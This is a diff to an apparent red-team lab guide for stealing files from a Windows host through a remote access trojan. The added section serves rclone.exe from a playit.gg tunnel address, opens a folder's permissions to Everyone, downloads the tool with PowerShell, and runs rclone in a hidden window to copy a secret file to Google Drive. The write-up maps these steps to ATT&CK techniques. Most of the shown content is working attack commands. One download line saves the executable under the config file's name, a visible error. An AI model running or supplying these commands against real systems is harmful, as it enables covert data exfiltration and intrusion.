@@ -105,8 +105,8 @@ To simulate real-world behavior and avoid direct upload via RAT:
 Go through **File Manager** to the expected folder and upload the **reclone.conf**, as it is small in size that's why we can upload it directly via RAT. But as the **rclone.exe** is big in size, thats why we need to send it via power shall. From the attacker, send PowerShell commands via RAT. You can do the same for the **rclone.conf** also.
 
 ```powershell
-Invoke-WebRequest -Uri "http://<attacker-ip>:8000/rclone.exe" -OutFile "C:\ProgramData\rclone.exe"
-# Invoke-WebRequest -Uri "http://<attacker-ip>:8000/rclone.conf" -OutFile "C:\ProgramData\rclone.conf"
+Invoke-WebRequest -Uri "http://<attacker-ip>:8000/rclone.exe" -OutFile "C:\PublicRAT\rclone.exe"
+# Invoke-WebRequest -Uri "http://<attacker-ip>:8000/rclone.conf" -OutFile "C:\PublicRAT\rclone.conf"
 ```
 
 ```powershell
@@ -134,7 +134,7 @@ Notes:
 
 ### 6. **Check Google Drive**
 
-Your file (e.g., `secret.txt`) should now appear in the root of your Google Drive. You need to wait some minutes (1-2) to get the file there.
+Your file (e.g., `secret.txt`) should now appear in the root of your Google Drive. You need to wait for some minutes (1-2) to get the file there.
 
 ---
 
@@ -148,3 +148,33 @@ Your file (e.g., `secret.txt`) should now appear in the root of your Google Driv
 | Ingress Tool        | T1105 - Ingress Tool Transfer             | Download `rclone.exe` and `.conf`   |
 | Exfiltration        | T1567.002 - Exfil to Cloud Storage        | Send files to Google Drive          |
 | Persistence/Stealth | T1027 - Obfuscated Files or Info          | Using trusted tools like PowerShell |
+
+
+### Full process using port forwarding
+
+* Start the playit.gg
+* E.g., start a server:
+   ```bash
+   python -m http.server 24547
+   ```
+* Then do the following:
+  ```cmd
+  mkdir C:\PublicRAT
+  icacls "C:\PublicRAT" /grant Everyone:(OI)(CI)M
+  ```
+  
+  Now your RAT shell should be able to **write files there**, e.g.:
+  
+  ```cmd
+  cmd.exe /c echo Hello > C:\PublicRAT\test.txt
+  ```
+* If the **test.txt** successfully write in that location, then do:
+```powershell
+Invoke-WebRequest -Uri "http://established-colombia.gl.at.ply.gg:24547/rclone.exe" -OutFile "C:\PublicRAT\rclone.exe"
+Invoke-WebRequest -Uri "http://established-colombia.gl.at.ply.gg:24547/rclone.exe" -OutFile "C:\PublicRAT\rclone.conf"
+```
+* Then transfer data using the following convention:
+```powershell
+Start-Process -WindowStyle Hidden -FilePath "C:\PublicRAT\rclone.exe" -ArgumentList 'copy "C:\Users\Public\Documents\newSecret.txt" myStorage:/ --config "C:\PublicRAT\rclone.conf"'
+```
+* Check your bsse drive and click recent, you will get the desired file.
